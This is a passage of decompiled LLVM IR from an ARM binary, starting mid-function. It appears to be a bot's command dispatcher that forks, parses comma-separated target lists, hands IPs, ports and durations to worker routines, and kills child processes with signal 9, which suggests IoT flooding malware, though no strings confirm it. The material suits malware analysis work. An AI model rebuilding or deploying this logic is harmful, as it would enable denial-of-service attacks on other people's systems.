  %v7_10ba4 = icmp eq i32 %arg1, 2
  br i1 %v7_10ba4, label %dec_label_pc_10bc4, label %dec_label_pc_10bac

dec_label_pc_10bac:                               ; preds = %dec_label_pc_10ba0
  %v2_10bb0 = load i32, i32* @global_var_2c890.36, align 4
  %v3_10bbc = call i32 @function_9340(i32 %v2_10bb0, i32 ptrtoint ([16 x i8]* @global_var_224dc.608 to i32))
  br label %dec_label_pc_11430

dec_label_pc_10bc4:                               ; preds = %dec_label_pc_10ba0
  %v1_10bc8 = add i32 %tmp, 4
  %v1_10bcc = inttoptr i32 %v1_10bc8 to i32*
  %v2_10bcc = load i32, i32* %v1_10bcc, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_224ec.610 to i32), i32* @r1, align 4
  %v3_10bd8 = inttoptr i32 %v2_10bcc to i8*
  %v4_10bd8 = call i32 @function_13fe0(i8* %v3_10bd8, i32 ptrtoint ([4 x i8]* @global_var_224ec.610 to i32))
  %v2_10be0 = icmp eq i32 %v4_10bd8, 0
  br i1 %v2_10be0, label %dec_label_pc_10be8, label %dec_label_pc_10c2c

dec_label_pc_10be8:                               ; preds = %dec_label_pc_10bc4
  %v2_10bec = load i32, i32* @global_var_32af4.612, align 4
  %v2_10bf0 = icmp eq i32 %v2_10bec, 0
  br i1 %v2_10bf0, label %dec_label_pc_11430, label %dec_label_pc_10bf8

dec_label_pc_10bf8:                               ; preds = %dec_label_pc_10be8
  %v2_10c08 = call i32 @function_12838(i32 %v2_10bec, i32 9)
  %v2_10c10 = load i32, i32* @global_var_2c890.36, align 4
  %v3_10c1c = call i32 @function_9340(i32 %v2_10c10, i32 ptrtoint ([13 x i8]* @global_var_224f0.614 to i32))
  store i32 0, i32* @global_var_32af4.612, align 4
  br label %dec_label_pc_10c2c

dec_label_pc_10c2c:                               ; preds = %dec_label_pc_10bc4, %dec_label_pc_10bf8
  %v2_10c34 = load i32, i32* %v1_10bcc, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_22500.616 to i32), i32* @r1, align 4
  %v3_10c40 = inttoptr i32 %v2_10c34 to i8*
  %v4_10c40 = call i32 @function_13fe0(i8* %v3_10c40, i32 ptrtoint ([3 x i8]* @global_var_22500.616 to i32))
  store i32 %v4_10c40, i32* @r0, align 4
  %v2_10c48 = icmp eq i32 %v4_10c40, 0
  br i1 %v2_10c48, label %dec_label_pc_10c50, label %dec_label_pc_10cb4

dec_label_pc_10c50:                               ; preds = %dec_label_pc_10c2c
  %v2_10c54 = load i32, i32* @global_var_32af4.612, align 4
  %v2_10c58 = icmp eq i32 %v2_10c54, 0
  br i1 %v2_10c58, label %dec_label_pc_10c60, label %dec_label_pc_11430

dec_label_pc_10c60:                               ; preds = %dec_label_pc_10c50
  %v0_10c60 = call i32 @function_126e0()
  %v2_10c70 = icmp eq i32 %v0_10c60, 0
  br i1 %v2_10c70, label %dec_label_pc_10c94, label %dec_label_pc_10c78

dec_label_pc_10c78:                               ; preds = %dec_label_pc_10c60
  store i32 %v0_10c60, i32* @global_var_32af4.612, align 4
  br label %dec_label_pc_11430

dec_label_pc_10c94:                               ; preds = %dec_label_pc_10c60
  %v2_10c98 = load i32, i32* @global_var_2c890.36, align 4
  %v3_10ca4 = call i32 @function_9340(i32 %v2_10c98, i32 ptrtoint ([12 x i8]* @global_var_22504.618 to i32))
  %v1_10ca8 = call i32 @function_e958(i32 %v3_10ca4)
  %v1_10cb0 = call i32 @function_12a34(i32 0)
  br label %dec_label_pc_10cb4

dec_label_pc_10cb4:                               ; preds = %dec_label_pc_10c2c, %dec_label_pc_10b80, %dec_label_pc_10c94
  %v2_10cb8 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_22510.620 to i32), i32* @r1, align 4
  %v3_10cc4 = inttoptr i32 %v2_10cb8 to i8*
  %v4_10cc4 = call i32 @function_13fe0(i8* %v3_10cc4, i32 ptrtoint ([8 x i8]* @global_var_22510.620 to i32))
  store i32 %v4_10cc4, i32* @r0, align 4
  %v2_10ccc = icmp eq i32 %v4_10cc4, 0
  br i1 %v2_10ccc, label %dec_label_pc_10cd4, label %dec_label_pc_10d18

dec_label_pc_10cd4:                               ; preds = %dec_label_pc_10cb4
  %v0_10cd4 = call i32 @function_a600()
  %v2_10cdc = icmp eq i32 %v0_10cd4, 0
  br i1 %v2_10cdc, label %dec_label_pc_10ce4, label %dec_label_pc_10d18

dec_label_pc_10ce4:                               ; preds = %dec_label_pc_10cd4
  %v2_10ce8 = load i32, i32* @global_var_2c890.36, align 4
  store i32 %v2_10ce8, i32* @r4, align 4
  %v2_10cf0 = load i32, i32* @global_var_32aec.554, align 4
  store i32 %v2_10cf0, i32* @r0, align 4
  %v1_10cf4 = call i32 @function_14814(i32 %v2_10cf0)
  %v0_10cfc = load i32, i32* @r4, align 4
  store i32 %v1_10cf4, i32* @r2, align 4
  %v3_10d08 = call i32 @function_9340(i32 %v0_10cfc, i32 ptrtoint ([13 x i8]* @global_var_22518.623 to i32))
  %v1_10d0c = call i32 @function_10030(i32 %v3_10d08)
  %v1_10d14 = call i32 @function_12a34(i32 0)
  br label %dec_label_pc_10d18

dec_label_pc_10d18:                               ; preds = %dec_label_pc_10cd4, %dec_label_pc_10cb4, %dec_label_pc_10ce4
  %v2_10d1c = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_22528.625 to i32), i32* @r1, align 4
  %v3_10d28 = inttoptr i32 %v2_10d1c to i8*
  %v4_10d28 = call i32 @function_13fe0(i8* %v3_10d28, i32 ptrtoint ([4 x i8]* @global_var_22528.625 to i32))
  %v2_10d30 = icmp eq i32 %v4_10d28, 0
  br i1 %v2_10d30, label %dec_label_pc_10d38, label %dec_label_pc_10f94

dec_label_pc_10d38:                               ; preds = %dec_label_pc_10d18
  %v7_10d40 = icmp slt i32 %arg1, 6
  br i1 %v7_10d40, label %dec_label_pc_11430, label %dec_label_pc_10d44

dec_label_pc_10d44:                               ; preds = %dec_label_pc_10d38
  %v1_10d48 = add i32 %tmp, 12
  %v1_10d4c = inttoptr i32 %v1_10d48 to i32*
  %v2_10d4c = load i32, i32* %v1_10d4c, align 4
  store i32 %v2_10d4c, i32* @r0, align 4
  %v1_10d54 = call i32 @function_161fc(i32 %v2_10d4c)
  %v7_10d5c = icmp eq i32 %v1_10d54, -1
  br i1 %v7_10d5c, label %dec_label_pc_11430, label %dec_label_pc_10d64

dec_label_pc_10d64:                               ; preds = %dec_label_pc_10d44
  %v1_10d68 = add i32 %tmp, 8
  %v1_10d6c = inttoptr i32 %v1_10d68 to i32*
  %v2_10d6c = load i32, i32* %v1_10d6c, align 4
  store i32 %v2_10d6c, i32* @r0, align 4
  %v1_10d74 = call i32 @function_161fc(i32 %v2_10d6c)
  %v7_10d7c = icmp eq i32 %v1_10d74, -1
  br i1 %v7_10d7c, label %dec_label_pc_11430, label %dec_label_pc_10d90

dec_label_pc_10d90:                               ; preds = %dec_label_pc_10d64
  %v1_10d94 = add i32 %tmp, 20
  %v1_10d98 = inttoptr i32 %v1_10d94 to i32*
  %v2_10d98 = load i32, i32* %v1_10d98, align 4
  store i32 %v2_10d98, i32* @r0, align 4
  %v1_10da0 = call i32 @function_161fc(i32 %v2_10d98)
  %v1_10da8 = icmp slt i32 %v1_10da0, 0
  br i1 %v1_10da8, label %dec_label_pc_11430, label %dec_label_pc_10db0

dec_label_pc_10db0:                               ; preds = %dec_label_pc_10d90
  %v7_10db4 = icmp eq i32 %arg1, 7
  br i1 %v7_10db4, label %dec_label_pc_10dbc, label %dec_label_pc_10de0

dec_label_pc_10dbc:                               ; preds = %dec_label_pc_10db0
  %v1_10dc0 = add i32 %tmp, 24
  %v1_10dc4 = inttoptr i32 %v1_10dc0 to i32*
  %v2_10dc4 = load i32, i32* %v1_10dc4, align 4
  store i32 %v2_10dc4, i32* @r0, align 4
  %v1_10dcc = call i32 @function_161fc(i32 %v2_10dc4)
  %v5_10dd8 = icmp sgt i32 %v1_10dcc, 0
  br i1 %v5_10dd8, label %dec_label_pc_10de0, label %dec_label_pc_11430

dec_label_pc_10de0:                               ; preds = %dec_label_pc_10db0, %dec_label_pc_10dbc
  %v1_10de4 = add i32 %tmp, 4
  %v1_10de8 = inttoptr i32 %v1_10de4 to i32*
  %v2_10de8 = load i32, i32* %v1_10de8, align 4
  %v2_10df8 = load i32, i32* %v1_10d6c, align 4
  store i32 %v2_10df8, i32* @r0, align 4
  %v1_10e00 = call i32 @function_161fc(i32 %v2_10df8)
  %v2_10e14 = load i32, i32* %v1_10d4c, align 4
  store i32 %v2_10e14, i32* @r0, align 4
  %v1_10e1c = call i32 @function_161fc(i32 %v2_10e14)
  %v1_10e2c = add i32 %tmp, 16
  %v1_10e30 = inttoptr i32 %v1_10e2c to i32*
  %v2_10e30 = load i32, i32* %v1_10e30, align 4
  br i1 %v7_10db4, label %dec_label_pc_10e44, label %dec_label_pc_10e60

dec_label_pc_10e44:                               ; preds = %dec_label_pc_10de0
  %v1_10e48 = add i32 %tmp, 24
  %v1_10e4c = inttoptr i32 %v1_10e48 to i32*
  %v2_10e4c = load i32, i32* %v1_10e4c, align 4
  store i32 %v2_10e4c, i32* @r0, align 4
  %v1_10e54 = call i32 @function_161fc(i32 %v2_10e4c)
  br label %dec_label_pc_10ea0

dec_label_pc_10e60:                               ; preds = %dec_label_pc_10de0
  br label %dec_label_pc_10ea0

dec_label_pc_10ea0:                               ; preds = %dec_label_pc_10e44, %dec_label_pc_10e60
  %storemerge5 = phi i32 [ 10, %dec_label_pc_10e60 ], [ %v1_10e54, %dec_label_pc_10e44 ]
  %v2_10e84 = load i32, i32* %v1_10d98, align 4
  store i32 %v2_10e84, i32* @r0, align 4
  %v1_10e8c = call i32 @function_161fc(i32 %v2_10e84)
  store i32 %v2_10de8, i32* @r0, align 4
  %v2_10ebc = call i32 @function_142f0(i32 %v2_10de8, i32 44)
  store i32 %v2_10ebc, i32* @r0, align 4
  %v2_10ec4 = icmp eq i32 %v2_10ebc, 0
  br i1 %v2_10ec4, label %dec_label_pc_10f50, label %dec_label_pc_10ecc

dec_label_pc_10ecc:                               ; preds = %dec_label_pc_10ea0
  %v2_10ed8 = call i32 @function_143f8(i32 %v2_10de8, i32 ptrtoint (i32* @global_var_224b0.588 to i32))
  store i32 %v2_10ed8, i32* @r0, align 4
  %v2_10f4419 = icmp eq i32 %v2_10ed8, 0
  br i1 %v2_10f4419, label %dec_label_pc_10f94, label %dec_label_pc_10ee8

dec_label_pc_10ee8:                               ; preds = %dec_label_pc_10ecc, %dec_label_pc_10f2c
  %storemerge1220 = phi i32 [ %v2_10f34, %dec_label_pc_10f2c ], [ %v2_10ed8, %dec_label_pc_10ecc ]
  %v0_10ee8 = call i32 @function_a600()
  %v2_10ef0 = icmp eq i32 %v0_10ee8, 0
  br i1 %v2_10ef0, label %dec_label_pc_10ef8, label %dec_label_pc_10f2c

dec_label_pc_10ef8:                               ; preds = %dec_label_pc_10ee8
  %v7_10f20 = call i32 @function_10330(i32 %storemerge1220, i32 %v1_10e00, i32 %v1_10e1c, i32 %v2_10e30, i32 %v1_10e8c, i32 %storemerge5, i32 32)
  %v1_10f28 = call i32 @function_12a34(i32 0)
  br label %dec_label_pc_10f2c

dec_label_pc_10f2c:                               ; preds = %dec_label_pc_10ee8, %dec_label_pc_10ef8
  %v2_10f34 = call i32 @function_143f8(i32 0, i32 ptrtoint (i32* @global_var_224b0.588 to i32))
  store i32 %v2_10f34, i32* @r0, align 4
  %v2_10f44 = icmp eq i32 %v2_10f34, 0
  br i1 %v2_10f44, label %dec_label_pc_10f94, label %dec_label_pc_10ee8

dec_label_pc_10f50:                               ; preds = %dec_label_pc_10ea0
  %v0_10f50 = call i32 @function_a600()
  %v2_10f58 = icmp eq i32 %v0_10f50, 0
  br i1 %v2_10f58, label %dec_label_pc_10f60, label %dec_label_pc_11430

dec_label_pc_10f60:                               ; preds = %dec_label_pc_10f50
  %v7_10f88 = call i32 @function_10330(i32 %v2_10de8, i32 %v1_10e00, i32 %v1_10e1c, i32 %v2_10e30, i32 %v1_10e8c, i32 %storemerge5, i32 32)
  %v1_10f90 = call i32 @function_12a34(i32 0)
  br label %dec_label_pc_10f94

dec_label_pc_10f94:                               ; preds = %dec_label_pc_10f2c, %dec_label_pc_10ecc, %dec_label_pc_10d18, %dec_label_pc_10f60
  %v2_10f98 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_2252c.628 to i32), i32* @r1, align 4
  %v3_10fa4 = inttoptr i32 %v2_10f98 to i8*
  %v4_10fa4 = call i32 @function_13fe0(i8* %v3_10fa4, i32 ptrtoint ([4 x i8]* @global_var_2252c.628 to i32))
  %v2_10fac = icmp eq i32 %v4_10fa4, 0
  br i1 %v2_10fac, label %dec_label_pc_10fb4, label %dec_label_pc_110f8

dec_label_pc_10fb4:                               ; preds = %dec_label_pc_10f94
  %v7_10fbc = icmp slt i32 %arg1, 4
  br i1 %v7_10fbc, label %dec_label_pc_11430, label %dec_label_pc_10fc0

dec_label_pc_10fc0:                               ; preds = %dec_label_pc_10fb4
  %v1_10fc4 = add i32 %tmp, 8
  %v1_10fc8 = inttoptr i32 %v1_10fc4 to i32*
  %v2_10fc8 = load i32, i32* %v1_10fc8, align 4
  store i32 %v2_10fc8, i32* @r0, align 4
  %v1_10fd0 = call i32 @function_161fc(i32 %v2_10fc8)
  %tmp59 = icmp slt i32 %v1_10fd0, 1
  br i1 %tmp59, label %dec_label_pc_11430, label %dec_label_pc_10fe0

dec_label_pc_10fe0:                               ; preds = %dec_label_pc_10fc0
  %v1_10fe4 = add i32 %tmp, 12
  %v1_10fe8 = inttoptr i32 %v1_10fe4 to i32*
  %v2_10fe8 = load i32, i32* %v1_10fe8, align 4
  store i32 %v2_10fe8, i32* @r0, align 4
  %v1_10ff0 = call i32 @function_161fc(i32 %v2_10fe8)
  %v5_10ffc = icmp sgt i32 %v1_10ff0, 0
  br i1 %v5_10ffc, label %dec_label_pc_11004, label %dec_label_pc_11430

dec_label_pc_11004:                               ; preds = %dec_label_pc_10fe0
  %v1_11008 = add i32 %tmp, 4
  %v1_1100c = inttoptr i32 %v1_11008 to i32*
  %v2_1100c = load i32, i32* %v1_1100c, align 4
  %v2_1101c = load i32, i32* %v1_10fc8, align 4
  store i32 %v2_1101c, i32* @r0, align 4
  %v1_11024 = call i32 @function_161fc(i32 %v2_1101c)
  %v2_11038 = load i32, i32* %v1_10fe8, align 4
  store i32 %v2_11038, i32* @r0, align 4
  %v1_11040 = call i32 @function_161fc(i32 %v2_11038)
  store i32 %v2_1100c, i32* @r0, align 4
  %v2_11058 = call i32 @function_142f0(i32 %v2_1100c, i32 44)
  store i32 %v2_11058, i32* @r0, align 4
  %v2_11060 = icmp eq i32 %v2_11058, 0
  br i1 %v2_11060, label %dec_label_pc_110d0, label %dec_label_pc_11068

dec_label_pc_11068:                               ; preds = %dec_label_pc_11004
  %v2_11074 = call i32 @function_143f8(i32 %v2_1100c, i32 ptrtoint (i32* @global_var_224b0.588 to i32))
  store i32 %v2_11074, i32* @r0, align 4
  %v2_110c416 = icmp eq i32 %v2_11074, 0
  br i1 %v2_110c416, label %dec_label_pc_110f8, label %dec_label_pc_11084

dec_label_pc_11084:                               ; preds = %dec_label_pc_11068, %dec_label_pc_110ac
  %storemerge1017 = phi i32 [ %v2_110b4, %dec_label_pc_110ac ], [ %v2_11074, %dec_label_pc_11068 ]
  %v0_11084 = call i32 @function_a600()
  %v2_1108c = icmp eq i32 %v0_11084, 0
  br i1 %v2_1108c, label %dec_label_pc_11094, label %dec_label_pc_110ac

dec_label_pc_11094:                               ; preds = %dec_label_pc_11084
  %v4_110a0 = call i32 @function_109f0(i32 %storemerge1017, i32 %v1_11024, i32 %v1_11040, i32 0)
  %v1_110a8 = call i32 @function_12a34(i32 0)
  br label %dec_label_pc_110ac

dec_label_pc_110ac:                               ; preds = %dec_label_pc_11084, %dec_label_pc_11094
  %v2_110b4 = call i32 @function_143f8(i32 0, i32 ptrtoint (i32* @global_var_224b0.588 to i32))
  store i32 %v2_110b4, i32* @r0, align 4
  %v2_110c4 = icmp eq i32 %v2_110b4, 0
  br i1 %v2_110c4, label %dec_label_pc_110f8, label %dec_label_pc_11084

dec_label_pc_110d0:                               ; preds = %dec_label_pc_11004
  %v0_110d0 = call i32 @function_a600()
  %v2_110d8 = icmp eq i32 %v0_110d0, 0
  br i1 %v2_110d8, label %dec_label_pc_110e0, label %dec_label_pc_11430

dec_label_pc_110e0:                               ; preds = %dec_label_pc_110d0
  %v4_110ec = call i32 @function_109f0(i32 %v2_1100c, i32 %v1_11024, i32 %v1_11040, i32 0)
  %v1_110f4 = call i32 @function_12a34(i32 0)
  br label %dec_label_pc_110f8

dec_label_pc_110f8:                               ; preds = %dec_label_pc_110ac, %dec_label_pc_11068, %dec_label_pc_10f94, %dec_label_pc_110e0
  %v2_110fc = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_22530.630 to i32), i32* @r1, align 4
  %v3_11108 = inttoptr i32 %v2_110fc to i8*
  %v4_11108 = call i32 @function_13fe0(i8* %v3_11108, i32 ptrtoint ([4 x i8]* @global_var_22530.630 to i32))
  %v2_11110 = icmp eq i32 %v4_11108, 0
  br i1 %v2_11110, label %dec_label_pc_11118, label %dec_label_pc_112f0

dec_label_pc_11118:                               ; preds = %dec_label_pc_110f8
  %v7_11120 = icmp slt i32 %arg1, 6
  br i1 %v7_11120, label %dec_label_pc_11430, label %dec_label_pc_11124

dec_label_pc_11124:                               ; preds = %dec_label_pc_11118
  %v1_11128 = add i32 %tmp, 4
  %v1_1112c = inttoptr i32 %v1_11128 to i32*
  %v2_1112c = load i32, i32* %v1_1112c, align 4
  store i32 %v2_1112c, i32* @r0, align 4
  %v2_11138 = call i32 @function_142f0(i32 %v2_1112c, i32 44)
  store i32 %v2_11138, i32* @r0, align 4
  %v2_11140 = icmp eq i32 %v2_11138, 0
  br i1 %v2_11140, label %dec_label_pc_11240, label %dec_label_pc_11148

dec_label_pc_11148:                               ; preds = %dec_label_pc_11124
  %v2_11150 = load i32, i32* %v1_1112c, align 4
  %v2_1115c = call i32 @function_143f8(i32 %v2_11150, i32 ptrtoint (i32* @global_var_224b0.588 to i32))
  store i32 %v2_1115c, i32* @r0, align 4
  %v2_1123414 = icmp eq i32 %v2_1115c, 0
  br i1 %v2_1123414, label %dec_label_pc_112f0, label %dec_label_pc_1116c.lr.ph

dec_label_pc_1116c.lr.ph:                         ; preds = %dec_label_pc_11148
  %v1_1118c = add i32 %tmp, 8
  %v1_11190 = inttoptr i32 %v1_1118c to i32*
  %v1_1119c = add i32 %tmp, 12
  %v1_111a0 = inttoptr i32 %v1_1119c to i32*
  %v1_111bc = add i32 %tmp, 16
  %v1_111c0 = inttoptr i32 %v1_111bc to i32*
  %v1_111cc = add i32 %tmp, 20
  %v1_111d0 = inttoptr i32 %v1_111cc to i32*
  %v1_111e4 = add i32 %tmp, 24
  %v1_111e8 = inttoptr i32 %v1_111e4 to i32*
  br label %dec_label_pc_1116c

dec_label_pc_1116c:                               ; preds = %dec_label_pc_1116c.lr.ph, %dec_label_pc_1121c
  %v0_1116c = call i32 @function_a600()
  %v2_11174 = icmp eq i32 %v0_1116c, 0
  br i1 %v2_11174, label %dec_label_pc_1117c, label %dec_label_pc_1121c

dec_label_pc_1117c:                               ; preds = %dec_label_pc_1116c
  %v2_11184 = load i32, i32* %v1_1112c, align 4
  store i32 %v2_11184, i32* @r5, align 4
  %v2_11190 = load i32, i32* %v1_11190, align 4
  store i32 %v2_11190, i32* @r6, align 4
  %v2_111a0 = load i32, i32* %v1_111a0, align 4
  store i32 %v2_111a0, i32* @r0, align 4
  %v1_111a8 = call i32 @function_161fc(i32 %v2_111a0)
  %v3_111b4 = urem i32 %v1_111a8, 65536
  store i32 %v3_111b4, i32* @r7, align 4
  %v2_111c0 = load i32, i32* %v1_111c0, align 4
  store i32 %v2_111c0, i32* @r8, align 4
  %v2_111d0 = load i32, i32* %v1_111d0, align 4
  store i32 %v2_111d0, i32* @r0, align 4
  %v1_111d8 = call i32 @function_161fc(i32 %v2_111d0)
  store i32 %v1_111d8, i32* @r4, align 4
  %v2_111e8 = load i32, i32* %v1_111e8, align 4
  store i32 %v2_111e8, i32* @r0, align 4
  %v1_111f0 = call i32 @function_161fc(i32 %v2_111e8)
  %v0_111f8 = load i32, i32* @r4, align 4
  %v0_11200 = load i32, i32* @r5, align 4
  %v0_11204 = load i32, i32* @r6, align 4
  %v0_11208 = load i32, i32* @r7, align 4
  %v0_1120c = load i32, i32* @r8, align 4
  %v6_11210 = trunc i32 %v0_11208 to i16
  %v7_11210 = call i32 @function_10108(i32 %v0_11200, i32 %v0_11204, i16 %v6_11210, i32 %v0_1120c, i32 %v0_111f8, i32 %v1_111f0)
  %v1_11218 = call i32 @function_12a34(i32 0)
  br label %dec_label_pc_1121c

dec_label_pc_1121c:                               ; preds = %dec_label_pc_1116c, %dec_label_pc_1117c
  %v2_11224 = call i32 @function_143f8(i32 0, i32 ptrtoint (i32* @global_var_224b0.588 to i32))
  store i32 %v2_11224, i32* @r0, align 4
  %v2_11234 = icmp eq i32 %v2_11224, 0
  br i1 %v2_11234, label %dec_label_pc_112f0, label %dec_label_pc_1116c

dec_label_pc_11240:                               ; preds = %dec_label_pc_11124
  %v0_11240 = call i32 @function_a600()
  %v2_11248 = icmp eq i32 %v0_11240, 0
  br i1 %v2_11248, label %dec_label_pc_11250, label %dec_label_pc_11430

dec_label_pc_11250:                               ; preds = %dec_label_pc_11240
  %v2_11258 = load i32, i32* %v1_1112c, align 4
  store i32 %v2_11258, i32* @r5, align 4
  %v1_11260 = add i32 %tmp, 8
  %v1_11264 = inttoptr i32 %v1_11260 to i32*
  %v2_11264 = load i32, i32* %v1_11264, align 4
  store i32 %v2_11264, i32* @r6, align 4
  %v1_11270 = add i32 %tmp, 12
  %v1_11274 = inttoptr i32 %v1_11270 to i32*
  %v2_11274 = load i32, i32* %v1_11274, align 4
  store i32 %v2_11274, i32* @r0, align 4
  %v1_1127c = call i32 @function_161fc(i32 %v2_11274)
  %v3_11288 = urem i32 %v1_1127c, 65536
  store i32 %v3_11288, i32* @r7, align 4
  %v1_11290 = add i32 %tmp, 16
  %v1_11294 = inttoptr i32 %v1_11290 to i32*
  %v2_11294 = load i32, i32* %v1_11294, align 4
  store i32 %v2_11294, i32* @r8, align 4
  %v1_112a0 = add i32 %tmp, 20
  %v1_112a4 = inttoptr i32 %v1_112a0 to i32*
  %v2_112a4 = load i32, i32* %v1_112a4, align 4
  store i32 %v2_112a4, i32* @r0, align 4
  %v1_112ac = call i32 @function_161fc(i32 %v2_112a4)
  store i32 %v1_112ac, i32* @r4, align 4
  %v1_112b8 = add i32 %tmp, 24
  %v1_112bc = inttoptr i32 %v1_112b8 to i32*
  %v2_112bc = load i32, i32* %v1_112bc, align 4
  store i32 %v2_112bc, i32* @r0, align 4
  %v1_112c4 = call i32 @function_161fc(i32 %v2_112bc)
  %v0_112cc = load i32, i32* @r4, align 4
  %v0_112d4 = load i32, i32* @r5, align 4
  %v0_112d8 = load i32, i32* @r6, align 4
  %v0_112dc = load i32, i32* @r7, align 4
  %v0_112e0 = load i32, i32* @r8, align 4
  %v6_112e4 = trunc i32 %v0_112dc to i16
  %v7_112e4 = call i32 @function_10108(i32 %v0_112d4, i32 %v0_112d8, i16 %v6_112e4, i32 %v0_112e0, i32 %v0_112cc, i32 %v1_112c4)
  %v1_112ec = call i32 @function_12a34(i32 0)
  br label %dec_label_pc_112f0

dec_label_pc_112f0:                               ; preds = %dec_label_pc_1121c, %dec_label_pc_11148, %dec_label_pc_110f8, %dec_label_pc_11250
  %v2_112f4 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_22534.632 to i32), i32* @r1, align 4
  %v3_11300 = inttoptr i32 %v2_112f4 to i8*
  %v4_11300 = call i32 @function_13fe0(i8* %v3_11300, i32 ptrtoint ([9 x i8]* @global_var_22534.632 to i32))
  store i32 %v4_11300, i32* @r0, align 4
  %v2_11308 = icmp eq i32 %v4_11300, 0
  br i1 %v2_11308, label %dec_label_pc_11310, label %dec_label_pc_11408

dec_label_pc_11310:                               ; preds = %dec_label_pc_112f0
  br label %dec_label_pc_113b4

dec_label_pc_11324:                               ; preds = %dec_label_pc_113b4, %dec_label_pc_113e8
  %v3_11328 = mul i32 %storemerge6, 4
  %v2_11334 = load i32, i32* @global_var_32af8.45, align 4
  %v2_11338 = add i32 %v2_11334, %v3_11328
  %v1_1133c = inttoptr i32 %v2_11338 to i32*
  %v2_1133c = load i32, i32* %v1_1133c, align 4
  %v2_11340 = icmp eq i32 %v2_1133c, 0
  br i1 %v2_11340, label %dec_label_pc_113a8, label %dec_label_pc_11348

dec_label_pc_11348:                               ; preds = %dec_label_pc_11324
  %v2_11360 = load i32, i32* %v1_1133c, align 4
  %v0_11364 = call i32 @function_12648()
  store i32 %v0_11364, i32* @r0, align 4
  %v9_1136c = icmp eq i32 %v2_11360, %v0_11364
  br i1 %v9_1136c, label %dec_label_pc_113a8, label %dec_label_pc_11374

dec_label_pc_11374:                               ; preds = %dec_label_pc_11348
  %v2_11384 = load i32, i32* @global_var_32af8.45, align 4
  %v2_11388 = add i32 %v2_11384, %v3_11328
  %v1_1138c = inttoptr i32 %v2_11388 to i32*
  %v2_1138c = load i32, i32* %v1_1138c, align 4
  %v2_11398 = call i32 @function_12838(i32 %v2_1138c, i32 9)
  store i32 %v2_11398, i32* @r0, align 4
  %v1_113a0 = add i32 %stack_var_-48.1, 1
  br label %dec_label_pc_113a8

dec_label_pc_113a8:                               ; preds = %dec_label_pc_11348, %dec_label_pc_11324, %dec_label_pc_11374
  %stack_var_-48.0 = phi i32 [ %stack_var_-48.1, %dec_label_pc_11324 ], [ %stack_var_-48.1, %dec_label_pc_11348 ], [ %v1_113a0, %dec_label_pc_11374 ]
  %v1_113ac = add i32 %storemerge6, 1
  br label %dec_label_pc_113b4

dec_label_pc_113b4:                               ; preds = %dec_label_pc_11310, %dec_label_pc_113a8
  %stack_var_-48.1 = phi i32 [ 0, %dec_label_pc_11310 ], [ %stack_var_-48.0, %dec_label_pc_113a8 ]
  %storemerge6 = phi i32 [ 0, %dec_label_pc_11310 ], [ %v1_113ac, %dec_label_pc_113a8 ]
  %v5_113cc = load i32, i32* @global_var_2c89c.43, align 4
  %v9_113e0 = icmp eq i32 %v5_113cc, 0
  br i1 %v9_113e0, label %dec_label_pc_113e8, label %dec_label_pc_11324

dec_label_pc_113e8:                               ; preds = %dec_label_pc_113b4
  %v2_113cc = load i32, i32* @global_var_2c898.42, align 4
  %tmp60 = icmp ugt i32 %v2_113cc, %storemerge6
  br i1 %tmp60, label %dec_label_pc_11324, label %dec_label_pc_11408

dec_label_pc_11408:                               ; preds = %dec_label_pc_113e8, %dec_label_pc_112f0
  %v2_1140c = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([15 x i8]* @global_var_22540.636 to i32), i32* @r1, align 4
  %v3_11418 = inttoptr i32 %v2_1140c to i8*
  %v4_11418 = call i32 @function_13fe0(i8* %v3_11418, i32 ptrtoint ([15 x i8]* @global_var_22540.636 to i32))
  %v2_11420 = icmp eq i32 %v4_11418, 0
  br i1 %v2_11420, label %dec_label_pc_11428, label %dec_label_pc_11430

dec_label_pc_11428:                               ; preds = %dec_label_pc_11408
  %v1_1142c = call i32 @function_163f8(i32 0)
  br label %dec_label_pc_11430

dec_label_pc_11430:                               ; preds = %dec_label_pc_10fe0, %dec_label_pc_10dbc, %dec_label_pc_10f50, %dec_label_pc_110d0, %dec_label_pc_11240, %dec_label_pc_11408, %dec_label_pc_10c50, %dec_label_pc_11118, %dec_label_pc_10fc0, %dec_label_pc_10fb4, %dec_label_pc_10d90, %dec_label_pc_10d64, %dec_label_pc_10d44, %dec_label_pc_10d38, %dec_label_pc_10be8, %dec_label_pc_10c78, %dec_label_pc_10bac, %dec_label_pc_10b68, %dec_label_pc_11428
  %v1_11438 = phi i32 [ %v1_10ff0, %dec_label_pc_10fe0 ], [ %v1_10dcc, %dec_label_pc_10dbc ], [ %v0_10f50, %dec_label_pc_10f50 ], [ %v0_110d0, %dec_label_pc_110d0 ], [ %v0_11240, %dec_label_pc_11240 ], [ %v4_11418, %dec_label_pc_11408 ], [ 0, %dec_label_pc_10c50 ], [ 0, %dec_label_pc_11118 ], [ %v1_10fd0, %dec_label_pc_10fc0 ], [ 0, %dec_label_pc_10fb4 ], [ %v1_10da0, %dec_label_pc_10d90 ], [ %v1_10d74, %dec_label_pc_10d64 ], [ %v1_10d54, %dec_label_pc_10d44 ], [ 0, %dec_label_pc_10d38 ], [ 0, %dec_label_pc_10be8 ], [ %v0_10c60, %dec_label_pc_10c78 ], [ %v3_10bbc, %dec_label_pc_10bac ], [ %v3_10b78, %dec_label_pc_10b68 ], [ %v1_1142c, %dec_label_pc_11428 ]
  store i32 %v3_10b34, i32* @r4, align 4
  store i32 %v6_10b34, i32* @r5, align 4
  store i32 %v9_10b34, i32* @r6, align 4
  store i32 %v12_10b34, i32* @r7, align 4
  store i32 %v15_10b34, i32* @r8, align 4
  store i32 %v18_10b34, i32* @fp, align 4
  ret i32 %v1_11438

; uselistorder directives
  uselistorder i32 %stack_var_-48.1, { 0, 2, 1 }
  uselistorder i32 %v3_11328, { 1, 0 }
  uselistorder i32 %v2_11224, { 1, 0 }
  uselistorder i32* %v1_1112c, { 2, 0, 1, 3 }
  uselistorder i32 %v2_110b4, { 2, 1, 0 }
  uselistorder i32 %v1_11040, { 1, 0 }
  uselistorder i32 %v1_11024, { 1, 0 }
  uselistorder i32 %v2_1100c, { 1, 0, 3, 2 }
